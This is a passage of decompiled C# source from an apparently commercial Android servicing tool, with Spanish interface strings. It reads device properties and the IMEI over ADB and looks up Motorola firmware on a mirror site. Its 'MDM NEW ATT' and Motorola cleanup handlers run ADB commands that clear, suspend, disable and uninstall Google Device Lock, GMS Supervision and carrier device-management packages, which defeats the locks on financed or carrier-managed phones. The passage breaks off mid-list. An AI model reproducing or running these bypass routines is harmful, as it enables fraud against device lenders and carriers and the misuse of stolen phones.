			this.txtOutput.AppendText(string.Format("Region : {0}", arg6));
			this.txtOutput.AppendText(string.Format("Android : {0}", arg7));
			this.txtOutput.AppendText(string.Format("Security : {0}", arg9));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg16));
			this.txtOutput.AppendText(string.Format("Bootloader : {0}", arg8));
			this.txtOutput.AppendText(string.Format("CP : {0}", arg10));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg11));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg13));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg14));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg15));
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00007BD0 File Offset: 0x00005DD0
		private void LeerHuawei(string device)
		{
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.config.marketing_name", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop ro.build.version.incremental", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop gsm.hw.operator.iso-country", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop persist.sys.nvcfg_file0", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.bootloader", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg16 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.build.fingerprint", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg17 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText(string.Format("SN : {0}", arg) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg3));
			this.txtOutput.AppendText(string.Format("Model : {0}", arg4));
			this.txtOutput.AppendText(string.Format("Version : {0}", arg5));
			this.txtOutput.AppendText(string.Format("Region : {0}", arg6));
			this.txtOutput.AppendText(string.Format("Android : {0}", arg8));
			this.txtOutput.AppendText(string.Format("Security : {0}", arg10));
			this.txtOutput.AppendText(string.Format("Bootloader : {0}", arg9));
			this.txtOutput.AppendText(string.Format("CP : {0}", arg11));
			this.txtOutput.AppendText(string.Format("CarrierId : {0}", arg7));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg13));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg14));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg15));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg16));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg17));
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00007E80 File Offset: 0x00006080
		private void LeerHonor(string device)
		{
			this.txtOutput.Clear();
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.config.marketing_name", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.build.version.incremental", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop gsm.msc.operator.iso-country", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop gsm.operator.alpha", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.bootloader", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string text2 = this.ExecuteAdbCommand("shell getprop ro.build.fingerprint", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg16 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText(string.Format("SN : {0}", arg) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg3));
			this.txtOutput.AppendText(string.Format("Model : {0}", text));
			this.txtOutput.AppendText(string.Format("Version : {0}", arg4));
			this.txtOutput.AppendText(string.Format("Region : {0}", arg5));
			this.txtOutput.AppendText(string.Format("Android : {0}", arg7));
			this.txtOutput.AppendText(string.Format("Security : {0}", arg9));
			this.txtOutput.AppendText(string.Format("Bootloader : {0}", arg8));
			this.txtOutput.AppendText(string.Format("CP : {0}", arg10));
			this.txtOutput.AppendText(string.Format("CarrierId : {0}", arg6));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg11));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg13));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg14));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg15));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg16));
			this.GuardarEnArchivo(text, this.txtOutput.Text);
			this.TextBox1.Text = "Log guardado en: \\Logs\\" + text;
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00008164 File Offset: 0x00006364
		private void LeerOnePlus(string device)
		{
			this.txtOutput.Clear();
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.rom.version", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop ro.boot.hwc", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			this.txtOutput.AppendText("\ud83d\udcf1 OnePlus Device" + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("SN: {0}", arg) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Model: {0}", arg2) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("OxygenOS: {0}", arg3) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Region: {0}", arg4) + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("Baseband: {0}", arg5) + Environment.NewLine);
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00008284 File Offset: 0x00006484
		private void LeerVivo(string device)
		{
			string arg = this.ExecuteAdbCommand("shell getprop ro.boot.serialno", device);
			string arg2 = this.ExecuteAdbCommand("shell getprop ro.product.manufacturer", device);
			string arg3 = this.ExecuteAdbCommand("shell getprop ro.product.model", device);
			string text = this.ExecuteAdbCommand("shell getprop ro.vivo.product.release.name", device);
			string arg4 = this.ExecuteAdbCommand("shell getprop gsm.operator.iso-country", device);
			string arg5 = this.ExecuteAdbCommand("shell getprop ro.oem.key1", device);
			string arg6 = this.ExecuteAdbCommand("shell getprop ro.oem.key1", device);
			string arg7 = this.ExecuteAdbCommand("shell getprop ro.build.version.release", device);
			string arg8 = this.ExecuteAdbCommand("shell getprop ro.bootloader", device);
			string arg9 = this.ExecuteAdbCommand("shell getprop ro.build.version.security_patch", device);
			string arg10 = this.ExecuteAdbCommand("shell getprop gsm.version.baseband", device);
			string arg11 = this.ExecuteAdbCommand("shell getprop ro.soc.manufacturer", device);
			string arg12 = this.ExecuteAdbCommand("shell getprop ro.soc.model", device);
			string arg13 = this.ExecuteAdbCommand("shell getprop ro.config.cpu_info_display", device);
			string arg14 = this.ExecuteAdbCommand("shell getprop gsm.sim.state", device);
			string arg15 = this.ExecuteAdbCommand("shell getprop persist.sys.usb.config", device);
			string text2 = this.ExecuteAdbCommand("shell getprop ro.build.fingerprint", device);
			string parcelRaw = this.ExecuteAdbCommand("shell service call iphonesubinfo 1 s16 com.android.shell", device);
			string arg16 = this.LimpiarIMEI(parcelRaw);
			this.txtOutput.AppendText("\ud83d\udcf1 Vivo Device" + Environment.NewLine);
			this.txtOutput.AppendText(string.Format("SN : {0}", arg));
			this.txtOutput.AppendText(string.Format("Brand : {0}", arg2));
			this.txtOutput.AppendText(string.Format("CodeName : {0}", arg3));
			this.txtOutput.AppendText(string.Format("Model : {0}", text));
			this.txtOutput.AppendText(string.Format("Version : {0}", arg4));
			this.txtOutput.AppendText(string.Format("Region : {0}", arg5));
			this.txtOutput.AppendText(string.Format("Android : {0}", arg7));
			this.txtOutput.AppendText(string.Format("Security : {0}", arg9));
			this.txtOutput.AppendText(string.Format("Bootloader : {0}", arg8));
			this.txtOutput.AppendText(string.Format("CP : {0}", arg10));
			this.txtOutput.AppendText(string.Format("CarrierId : {0}", arg6));
			this.txtOutput.AppendText(string.Format("Cpu : {0}", arg11));
			this.txtOutput.AppendText(string.Format("Cpu Type : {0}", arg12));
			this.txtOutput.AppendText(string.Format("Hardware ID : {0}", arg13));
			this.txtOutput.AppendText(string.Format("SIM State : {0}", arg14));
			this.txtOutput.AppendText(string.Format("USB Config : {0}", arg15));
			this.txtOutput.AppendText(string.Format("IMEI : {0}", arg16));
			this.GuardarEnArchivo(text, this.txtOutput.Text);
			this.TextBox1.Text = "Log guardado en: \\Logs\\" + text;
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00008570 File Offset: 0x00006770
		private string LimpiarIMEI(string parcelRaw)
		{
			string result;
			try
			{
				string text = "";
				string[] array = parcelRaw.Split(new string[]
				{
					"\n",
					"\r\n"
				}, StringSplitOptions.RemoveEmptyEntries);
				foreach (string text2 in array)
				{
					bool flag = text2.Contains("'");
					if (flag)
					{
						string[] array3 = text2.Split(new char[]
						{
							'\''
						});
						bool flag2 = array3.Length > 1;
						if (flag2)
						{
							text += array3[1].Replace(".", "").Replace(" ", "").Replace("'", "");
						}
					}
				}
				result = text.Trim();
			}
			catch (Exception ex)
			{
				result = "Error al limpiar IMEI";
			}
			return result;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00008668 File Offset: 0x00006868
		private void SetUiState(bool running)
		{
			this.btnopenfwmt.Enabled = !running;
			this.btnCancelarProceso.Enabled = running;
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00008688 File Offset: 0x00006888
		private async void btnOpenFwMt_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.btnCancelarProceso.Enabled = true;
				this.SetAllButtonsEnabled(false, null);
				this.ListView1.Visible = true;
				this.ProgressBar1.Value = 0;
				string baseUrl = "https://mirrors.lolinet.com/firmware/lenomola/";
				string[] years = new string[]
				{
					"2025",
					"2024",
					"2023",
					"2022"
				};
				try
				{
					bool ok = await this.CargarFirmwaresCompatiblesAsync(baseUrl, years);
					if (!ok)
					{
						this.txtOutput.AppendText("❌ No se encontraron firmwares compatibles.\r\n");
						string textoPlano = this.LimpiarTexto(this.txtOutput.Text);
						string codename = this.ExtraerValorDesdeTexto(textoPlano, "Codename:");
						foreach (string y in years)
						{
							string fallbackUrl = string.Format("{0}{1}/{2}/official/", baseUrl, y, codename);
							this.txtOutput.AppendText(string.Format("\ud83d\udd0d Probando carpeta genérica: {0}{1}", fallbackUrl, "\r\n"));
							if (await this.UrlExisteAsync(fallbackUrl))
							{
								this.txtOutput.AppendText(string.Format("\ud83d\udd17 Abriendo carpeta genérica: {0}{1}", fallbackUrl, "\r\n"));
								try
								{
									Process.Start(new ProcessStartInfo(fallbackUrl)
									{
										UseShellExecute = true
									});
								}
								catch (Exception ex)
								{
									this.txtOutput.AppendText("⚠️ Error al abrir navegador: " + ex.Message + "\r\n");
								}
								break;
							}
						}
					}
					else
					{
						this.txtOutput.AppendText("✅ Firmwares compatibles agregados al listado.\r\n");
					}
				}
				catch (OperationCanceledException ex3)
				{
					this.txtOutput.AppendText("⚠ Operación cancelada por el usuario.\r\n");
				}
				catch (Exception ex2)
				{
					MessageBox.Show("❌ Error inesperado: " + ex2.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.SetAllButtonsEnabled(true, null);
				}
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000086D0 File Offset: 0x000068D0
		private async Task<bool> CargarFirmwaresCompatiblesAsync(string baseUrl, IEnumerable<string> years)
		{
			this.ConfigurarListView();
			string textoPlano = this.LimpiarTexto(this.txtOutput.Text);
			string codename = this.ExtraerValorDesdeTexto(textoPlano, "Codename:");
			string carrierid = this.ExtraerValorDesdeTexto(textoPlano, "Carrier ID:");
			bool flag = string.IsNullOrWhiteSpace(codename) || string.IsNullOrWhiteSpace(carrierid);
			bool result;
			if (flag)
			{
				MessageBox.Show("Primero leer dispositivo en Fastboot");
				result = false;
			}
			else
			{
				IEnumerable<string> vars = CarrierHelper.GetVariations(carrierid);
				bool foundAny = false;
				try
				{
					foreach (string yearStr in years)
					{
						try
						{
							foreach (string carrierVar in vars)
							{
								string dirUrl = string.Format("{0}{1}/{2}/official/{3}/", new object[]
								{
									baseUrl,
									yearStr,
									codename,
									carrierVar
								});
								this.txtOutput.AppendText("\ud83d\udd17 Buscando:\r\n");
								bool flag2 = await this.UrlExisteAsync(dirUrl);
								if (flag2)
								{
									this.txtOutput.AppendText(string.Format("✅ Carpeta válida: {0}", dirUrl) + "\r\n");
									string html = this.DescargarHtml(dirUrl);
									List<string> archivos = this.ObtenerListaDeZips(html);
									try
									{
										foreach (string archivo in archivos)
										{
											if (archivo.IndexOf(codename, StringComparison.OrdinalIgnoreCase) >= 0)
											{
												string nombre = Path.GetFileName(archivo);
												string fullUrl = dirUrl + nombre;
												ListViewItem item = new ListViewItem(nombre);
												item.SubItems.Add(yearStr);
												item.SubItems.Add(fullUrl);
												this.ListView1.Items.Add(item);
												foundAny = true;
											}
										}
									}
									finally
									{
										List<string>.Enumerator enumerator3;
										((IDisposable)enumerator3).Dispose();
									}
									break;
								}
							}
						}
						finally
						{
							IEnumerator<string> enumerator2;
							if (enumerator2 != null)
							{
								enumerator2.Dispose();
							}
						}
						if (foundAny)
						{
							break;
						}
					}
				}
				finally
				{
					IEnumerator<string> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				result = foundAny;
			}
			return result;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00008724 File Offset: 0x00006924
		private async Task<string> DescargarHtmlAsync(string url)
		{
			string result;
			using (HttpClient client = new HttpClient
			{
				Timeout = TimeSpan.FromSeconds(10.0)
			})
			{
				result = await client.GetStringAsync(url);
			}
			return result;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00008770 File Offset: 0x00006970
		private void btndwlfwmt_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.ListView1.Visible = true;
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				this.AbrirFirmwareEnNavegador();
				try
				{
				}
				catch (Exception ex)
				{
					MessageBox.Show("❌ Error: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					base.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						this.AplicarPermisosDesdeFirebasePorPlan();
					}));
				}
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00008860 File Offset: 0x00006A60
		private void AbrirFirmwareEnNavegador()
		{
			Form1._Closure$__122-0 CS$<>8__locals1 = new Form1._Closure$__122-0(CS$<>8__locals1);
			string texto = this.LimpiarTexto(this.txtOutput.Text);
			string text = this.ExtraerValorDesdeTexto(texto, "Codename:");
			string text2 = this.ExtraerValorDesdeTexto(texto, "Carrier ID:");
			CS$<>8__locals1.$VB$Local_firmware = this.ExtraerValorDesdeTexto(texto, "Firmware:");
			bool flag = string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(CS$<>8__locals1.$VB$Local_firmware);
			if (flag)
			{
				MessageBox.Show("No se encontró información de dispositivo. Verifique Read Fastboot");
			}
			else
			{
				string text3 = "https://mirrors.lolinet.com/firmware/lenomola/";
				string[] array = new string[]
				{
					"2025",
					"2024",
					"2023",
					"2022",
					"2021"
				};
				bool flag2 = false;
				foreach (string text4 in array)
				{
					string text5 = string.Format("{0}{1}/{2}/official/{3}/", new object[]
					{
						text3,
						text4,
						text,
						text2.ToUpper()
					});
					bool flag3 = this.UrlExiste(text5);
					if (flag3)
					{
						this.txtOutput.AppendText("✅ Firmware compatible encontrado: \r\n");
						string html = this.DescargarHtml(text5);
						List<string> source = this.ObtenerListaDeZips(html);
						string text6 = source.FirstOrDefault((CS$<>8__locals1.$I0 == null) ? (CS$<>8__locals1.$I0 = ((string x) => x.Contains(CS$<>8__locals1.$VB$Local_firmware))) : CS$<>8__locals1.$I0);
						bool flag4 = !string.IsNullOrEmpty(text6);
						if (flag4)
						{
							string fileName = text5 + Path.GetFileName(text6);
							this.txtOutput.AppendText("\ud83d\udd17 Descarga directa de firmware: \r\n");
							Process.Start(new ProcessStartInfo
							{
								FileName = fileName,
								UseShellExecute = true
							});
						}
						else
						{
							this.txtOutput.AppendText("⚠️ Firmware exacto no encontrado. Abriendo carpeta manualmente: " + text5 + "\r\n");
							Process.Start(new ProcessStartInfo
							{
								FileName = text5,
								UseShellExecute = true
							});
						}
						flag2 = true;
						break;
					}
				}
				bool flag5 = !flag2;
				if (flag5)
				{
				}
			}
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x00008A7C File Offset: 0x00006C7C
		private bool UrlExiste(string url)
		{
			bool result;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
				httpWebRequest.Method = "HEAD";
				httpWebRequest.UserAgent = "Mozilla/5.0";
				httpWebRequest.Timeout = 3000;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					result = (httpWebResponse.StatusCode == HttpStatusCode.OK);
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00008B10 File Offset: 0x00006D10
		private string DescargarHtml(string url)
		{
			string result;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add("User-Agent", "Mozilla/5.0");
					result = webClient.DownloadString(url);
				}
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00008B84 File Offset: 0x00006D84
		private List<string> ObtenerListaDeZips(string html)
		{
			List<string> list = new List<string>();
			Regex regex = new Regex("href=\"([^\"]+\\.zip)\"", RegexOptions.IgnoreCase);
			try
			{
				foreach (object obj in regex.Matches(html))
				{
					Match match = (Match)obj;
					list.Add(match.Groups[1].Value);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return list;
		}

		// Token: 0x060000A6 RID: 166 RVA: 0x00008C14 File Offset: 0x00006E14
		private async Task AbrirUrlsDeFirmwareDesdeLogAsync()
		{
			try
			{
				string textoPlano = this.LimpiarTexto(this.txtOutput.Text);
				string codename = this.ExtraerValorDesdeTexto(textoPlano, "Codename:");
				string carrierid = this.ExtraerValorDesdeTexto(textoPlano, "Carrier ID:");
				bool flag = string.IsNullOrWhiteSpace(codename) || string.IsNullOrWhiteSpace(carrierid);
				if (flag)
				{
					MessageBox.Show("No se encontró información de dispositivo. Verifique Read Fastboot");
				}
				else
				{
					this.txtOutput.AppendText("\ud83d\udd0d Buscando firmwares disponibles..." + Environment.NewLine);
					string[] baseUrls = new string[]
					{
						"https://mirrors.lolinet.com/firmware/lenomola/",
						"https://mirrors-obs-1.lolinet.com/firmware/lenomola/"
					};
					string[] years = new string[]
					{
						"2025",
						"2024",
						"2023",
						"2022"
					};
					string raw = carrierid.Trim();
					string[] carrierVariations = new string[]
					{
						raw,
						raw.ToUpperInvariant(),
						raw.ToLowerInvariant(),
						Conversions.ToString(char.ToUpperInvariant(raw[0])) + raw.Substring(1).ToLowerInvariant()
					};
					string lastBase = "";
					string lastYear = "";
					foreach (string baseUrl in baseUrls)
					{
						lastBase = baseUrl;
						foreach (string yearStr in years)
						{
							lastYear = yearStr;
							foreach (string carrierVar in carrierVariations)
							{
								string fullUrl = string.Format("{0}{1}/{2}/official/{3}/", new object[]
								{
									baseUrl,
									yearStr,
									codename,
									carrierVar
								});
								bool flag2 = await this.UrlExisteAsync(fullUrl);
								if (flag2)
								{
									this.txtOutput.AppendText(string.Format("✅ Encontrado: {0}{1}", fullUrl, Environment.NewLine));
									try
									{
									}
									catch (Exception ex3)
									{
									}
									return;
								}
							}
						}
					}
					string errorUrl = string.Format("{0}{1}/{2}/official/", lastBase, lastYear, codename);
					this.txtOutput.AppendText(string.Format("\ud83d\udeab No se encontró ningún directorio válido. Abriendo: {0}{1}", errorUrl, Environment.NewLine));
					try
					{
						Process.Start(new ProcessStartInfo(errorUrl)
						{
							UseShellExecute = true
						});
					}
					catch (Exception ex)
					{
						this.txtOutput.AppendText("⚠️ Error al abrir navegador: " + ex.Message + Environment.NewLine);
					}
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("❌ Error inesperado: " + ex2.Message);
			}
		}

		// Token: 0x060000A7 RID: 167 RVA: 0x00008C58 File Offset: 0x00006E58
		private async Task<bool> UrlExisteAsync(string url)
		{
			bool result;
			try
			{
				using (HttpClient client = new HttpClient
				{
					Timeout = TimeSpan.FromSeconds(5.0)
				})
				{
					using (HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Head, url))
					{
						HttpResponseMessage resp = await client.SendAsync(req);
						if (resp.IsSuccessStatusCode)
						{
							result = true;
						}
						else if (resp.StatusCode == HttpStatusCode.MethodNotAllowed || resp.StatusCode == HttpStatusCode.Forbidden)
						{
							HttpResponseMessage respGet = await client.GetAsync(url);
							result = respGet.IsSuccessStatusCode;
						}
						else
						{
							result = false;
						}
					}
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x00008CA4 File Offset: 0x00006EA4
		private string ExtraerValorDesdeTexto(string texto, string etiqueta)
		{
			Regex regex = new Regex(string.Format("{0}\\s*(.*)", Regex.Escape(etiqueta)), RegexOptions.IgnoreCase);
			foreach (string text in texto.Split(new string[]
			{
				"\r",
				"\n"
			}, StringSplitOptions.RemoveEmptyEntries))
			{
				Match match = regex.Match(text.Trim());
				bool success = match.Success;
				if (success)
				{
					return match.Groups[1].Value.Trim();
				}
			}
			return "";
		}

		// Token: 0x060000A9 RID: 169 RVA: 0x00008D44 File Offset: 0x00006F44
		private string ExtraerFirmwareDeLineasSeparadas(string linea0, string linea1)
		{
			string text = "";
			string text2 = "";
			checked
			{
				foreach (string text3 in linea0.Split(new string[]
				{
					Environment.NewLine,
					"\r\n",
					"\n"
				}, StringSplitOptions.None))
				{
					bool flag = text3.Contains("ro.");
					if (flag)
					{
						int num = text3.IndexOf(":");
						bool flag2 = num != -1;
						if (flag2)
						{
							text = text3.Substring(num + 1).Trim();
						}
					}
				}
				foreach (string text4 in linea1.Split(new string[]
				{
					Environment.NewLine,
					"\r\n",
					"\n"
				}, StringSplitOptions.None))
				{
					bool flag3 = text4.Contains("ro.");
					if (flag3)
					{
						int num2 = text4.IndexOf(":");
						bool flag4 = num2 != -1;
						if (flag4)
						{
							text2 = text4.Substring(num2 + 1).Trim();
						}
					}
				}
				text = text.TrimEnd(new char[]
				{
					'.'
				});
				text2 = text2.TrimStart(new char[]
				{
					'.'
				});
				return text + text2;
			}
		}

		// Token: 0x060000AA RID: 170 RVA: 0x00008EA0 File Offset: 0x000070A0
		private void btnmdmnewatt_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				try
				{
					List<string> adbDevices = this.GetAdbDevices();
					bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
					if (flag2)
					{
						MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
						return;
					}
					string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					Dictionary<string, string> dictionary = new Dictionary<string, string>
					{
						{
							"Download Provider",
							"com.android.providers.downloads"
						},
						{
							"Google Device Lock",
							"com.google.android.devicelockcontroller"
						},
						{
							"Google Overlay Lock",
							"com.google.android.overlay.devicelockcontroller"
						},
						{
							"Honor OUC",
							"com.hihonor.ouc"
						},
						{
							"Honor System Updater",
							"m.hihonor.systemappsupdater"
						},
						{
							"Dynamic System",
							"com.android.dynsystem"
						},
						{
							"GMS Supervision",
							"com.google.android.gms.supervision"
						},
						{
							"Download UI",
							"com.android.providers.downloads.ui"
						}
					};
					this.MostrarEstadoAntesDelProceso("MDM NEW ATT", dictionary, selectedDevice);
					List<string> list = new List<string>();
					List<string> list2 = new List<string>();
					List<string> list3 = new List<string>();
					List<string> list4 = new List<string>();
					List<string> list5 = new List<string>();
					List<string> list6 = new List<string>();
					List<string> list7 = new List<string>();
					try
					{
						foreach (string arg in dictionary.Values)
						{
							list.Add(string.Format("shell pm clear --user 0 {0}", arg));
							list5.Add(string.Format("shell pm disable-user --user 0 {0}", arg));
							list6.Add(string.Format("shell pm uninstall --user 0 {0}", arg));
							list2.Add(string.Format("shell am kill {0}", arg));
							list7.Add(string.Format("shell am crash {0}", arg));
							list3.Add(string.Format("shell am set-inactive {0}", arg));
							list4.Add(string.Format("shell pm suspend {0}", arg));
						}
					}
					finally
					{
						Dictionary<string, string>.ValueCollection.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					List<List<string>> etapas = new List<List<string>>
					{
						list,
						list2,
						list3,
						list4,
						list5,
						list6,
						list7
					};
					this.EjecutarProcesoAdb("Eliminar apps MDM NEW ATT", etapas, selectedDevice);
					this.txtOutput.AppendText("En caso de no funcionar, intentar con MÉTODO NEW." + Environment.NewLine);
				}
				catch (Exception ex)
				{
					MessageBox.Show(string.Format("Error durante el proceso: {0}", ex.Message));
				}
				finally
				{
					this.processRunning = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.btnCancelarProceso.Enabled = false;
				}
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x060000AB RID: 171 RVA: 0x0000920C File Offset: 0x0000740C
		private void btnCleanMotoApps_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				try
				{
					List<string> adbDevices = this.GetAdbDevices();
					bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
					if (flag2)
					{
						MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
					}
					else
					{
						string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						Dictionary<string, string> dictionary = new Dictionary<string, string>
						{
							{
								"ATT Operador ext",
								"com.motorola.att.phone.extensions"
							},
							{
								"OBE Motorola",
								"com.aura.oobe.motorola"
							},
							{
								"M DeviceLock",
								"com.motorola.ccc.devicemanagement"
							},
							{
								"M Device Notification",
								"com.motorola.ccc.notification"
							},
							{
								"Carrier Config",
								"com.motorola.carrierconfig"
							},
							{
								"DIMO",
								"com.motorola.dimo"
							},
							{
								"Android Prov",
								"com.android.providers.downloads"
							},
							{
								"Android UI",
								"com.android.providers.downloads.ui"
							},
							{
								"Easy Pref",
								"com.motorola.easyprefix"
							},
							{
								"G Supervision",
								"com.google.android.gms.supervision"
							},
							{
								"Google Device Lock",
								"com.google.android.devicelockcontroller"
							},
							{
								"M  Retail",
